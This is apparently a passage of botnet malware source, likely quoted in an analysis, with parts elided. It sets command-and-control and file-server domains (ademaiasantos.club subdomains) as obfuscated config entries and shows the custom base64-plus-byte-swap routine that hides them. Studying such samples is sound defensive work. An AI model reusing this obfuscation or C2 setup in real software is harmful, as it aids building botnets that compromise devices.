...
{
	// t.ademaiasantos.club
	load_entry(ENTRY_CNC_DOMAIN, "mcpF2c5V3byVGZu92ZyVycw5wdAA", 28);
    // f.ademaiasantos.club
    load_entry(ENTRY_FILE_SERVER_DOMAIN, "mcpF2c5V3byVGZu92ZyVycw5wdAA", 28);
...
void encode(char *src, char *dst, uint8_t len)
{
    int i = 0;
    int j = 0;
    ...
    for(i = 0; i < len; i = i)
    {
        ...
        c = src[i++];
        t = (a << 0x10) + (b << 0x08) + c;
        buf[j++] = table[(t >> 3 * 6) & 0x3F];
        buf[j++] = table[(t >> 2 * 6) & 0x3F];
        buf[j++] = table[(t >> 1 * 6) & 0x3F];
        buf[j++] = table[(t >> 0 * 6) & 0x3F];
    }
    // Switch every 2 bytes
    for(i = 0; i < j; i += 2)
    {
        char tmp = buf[i];
        buf[i] = buf[i + 1];
    ...
    #ifdef DEBUG
    printf("Obfuscated data \"%s\", Length %d\n", dst, j);
    #endif
